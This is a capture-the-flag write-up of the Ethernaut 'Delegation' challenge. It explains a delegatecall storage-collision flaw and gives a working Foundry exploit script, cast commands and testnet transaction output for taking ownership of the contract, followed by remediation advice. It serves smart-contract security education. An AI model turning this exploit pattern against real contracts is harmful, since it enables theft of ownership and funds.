# Ethernaut Challenge 06 — Delegation

## Goal

The challenge is solved when the attacker successfully claims ownership of the `Delegation` contract instance.

**Instance:**

```text
0x83B8331d99f5cc2C1c5B26A5f436a0d686Aa6b19
```

## Vulnerability

The challenge consists of two contracts: `Delegate` and `Delegation`.

```solidity
contract Delegate {
    address public owner;

    constructor(address _owner) {
        owner = _owner;
    }

    function pwn() public {
        owner = msg.sender;
    }
}

contract Delegation {
    address public owner;
    Delegate delegate;

    constructor(address _delegateAddress) {
        delegate = Delegate(_delegateAddress);
        owner = msg.sender;
    }

    fallback() external {
        (bool result,) = address(delegate).delegatecall(msg.data);
        if (result) {
            this;
        }
    }
}
```

The vulnerability stems from the use of `delegatecall` inside `Delegation`'s fallback function combined with matching storage layouts.

### 1. `delegatecall` Execution Context

Unlike a standard `call`, `delegatecall` executes code from another contract (`Delegate`) **within the context of the calling contract (`Delegation`)**:

* `address(this)` is `Delegation`.
* `msg.sender` remains the original caller (the attacker).
* `msg.value` remains unchanged.
* **Storage writes operate on `Delegation`'s storage**, not `Delegate`'s storage.

### 2. Storage Layout Collision

In Solidity, contract state variables are assigned storage slots sequentially starting at slot 0:

| Storage Slot | `Delegate` Variable | `Delegation` Variable |
| :--- | :--- | :--- |
| **Slot 0** | `address public owner` | `address public owner` |
| **Slot 1** | *(empty)* | `Delegate delegate` |

When `Delegate.pwn()` executes:

```solidity
function pwn() public {
    owner = msg.sender;
}
```

The EVM writes `msg.sender` to **Storage Slot 0**. Because the execution happens via `delegatecall` inside `Delegation`, it modifies **Storage Slot 0 of `Delegation`**, overwriting its `owner` with `msg.sender`.

### 3. Fallback Routing via Method ID

`Delegation` has no explicit `pwn()` function. Sending calldata containing the 4-byte selector:

```solidity
bytes memory data = abi.encodeWithSignature("pwn()"); // 0xdd365b8b
```

triggers `Delegation`'s `fallback()` function, which blindly forwards `msg.data` via `delegatecall` to the `delegate` address.

---

## Attack Path

```text
Attacker (EOA)
      │
      │ 1. Send low-level call to Delegation with data = 0xdd365b8b ("pwn()")
      ▼
Delegation Contract
      │
      │ 2. Function not found -> triggers fallback()
      │ 3. Executes address(delegate).delegatecall(0xdd365b8b)
      ▼
Delegate Contract Code (executed in Delegation's context)
      │
      │ 4. Executes pwn() -> writes msg.sender to Slot 0
      ▼
Delegation Storage
      │
      │ 5. Slot 0 (owner) overwritten with Attacker's address!
      ▼
Attacker is now the owner
```

---

## Proof of Concept

The exploit was verified locally via Foundry unit tests and executed on-chain against the deployed Sepolia instance.

**Attack Script (`DelegationAttack.s.sol`):**

```solidity
contract DelegationAttackScript is Script {
    function run() external {
        address delegationAddress = vm.envAddress("DELEGATION_ADDRESS");
        Delegation delegation = Delegation(delegationAddress);

        vm.startBroadcast();

        bytes memory payload = abi.encodeWithSignature("pwn()");
        (bool success, ) = address(delegation).call{gas: 100000}(payload);
        require(success, "Exploit transaction failed");

        vm.stopBroadcast();
    }
}
```

### 1. Verify the initial owner

```bash
cast call 0x83B8331d99f5cc2C1c5B26A5f436a0d686Aa6b19 \
    "owner()(address)" \
    --rpc-url $RPC_URL
```

Initial owner:

```text
0x73379d8B82Fda494ee59555f333DF7D44483fD58
```

### 2. Execute the exploit on Sepolia

```bash
export DELEGATION_ADDRESS=0x83B8331d99f5cc2C1c5B26A5f436a0d686Aa6b19

forge script script/challenge-06_Delegation/DelegationAttack.s.sol:DelegationAttackScript \
    --private-key $PRIVATE_KEY \
    --rpc-url $RPC_URL \
    --broadcast
```

On-chain execution details:

```text
Transaction Hash → 0x125ea5abc9ba5592ab7695a81aabf1d35bd019b221ff615aaf1d74aa7b7b1802
Block Number     → 11787156
Gas Used         → 31,204
Calldata         → 0xdd365b8b (pwn())
Status           → 0x1 (Success)
```

### 3. Verify ownership takeover

```bash
cast call 0x83B8331d99f5cc2C1c5B26A5f436a0d686Aa6b19 \
    "owner()(address)" \
    --rpc-url $RPC_URL
```

Result:

```text
0xc57aB1ceF012CC669C89cA4Efd929b807BD15a4c
```

The `owner` variable changed from the Ethernaut Level Factory (`0x7337...`) to the attacker's EOA (`0xc57a...`), confirming successful ownership takeover on Sepolia.

---

## Impact

**Severity: Critical**

Any arbitrary external caller can trigger `delegatecall` with crafted calldata. Because the implementation contract contains a public function modifying storage slot 0, anyone can instantly seize full ownership and administrative control of the `Delegation` contract with a single transaction.

In production architectures (such as upgradeable proxies or multi-sig wallets), an unprotected `delegatecall` vulnerability allows malicious actors to:
1. Overwrite proxy admin addresses or implementation pointers.
2. Drain contract funds via unauthorized `selfdestruct` or token transfer calls.
3. Completely compromise contract state and logic.

---

## Remediation

1. **Avoid Arbitrary `delegatecall` in Public Fallback Functions:**
   Never expose unconstrained `delegatecall` functionality to arbitrary user input. Restrict callable functions using strict dispatching or function white-listing.

2. **Strict Access Control on Implementations:**
   If using proxy/delegate patterns, ensure that initialization and state-changing functions in logic contracts are strictly protected or locked (e.g. `_disableInitializers()` in OpenZeppelin upgradeable contracts).

3. **Storage Layout Preservation:**
   When using proxy delegation, use dedicated storage slots (such as ERC-1967 structured storage slots) or ensure matching storage layouts to prevent unintended storage slot collisions.

---

## Audit Takeaway

**`delegatecall` preserves context: it executes target code using the caller's storage, `msg.sender`, and balance.**

Whenever a contract delegates calls:
* The target contract's functions execute as if they are internal functions of the caller.
* Any assignment to a state variable in the target contract modifies the variable at the **equivalent storage slot in the caller contract**, regardless of variable names or types.
* An open `fallback()` that executes `delegatecall(msg.data)` without access control or selector validation effectively exposes every state variable of the contract to arbitrary modification.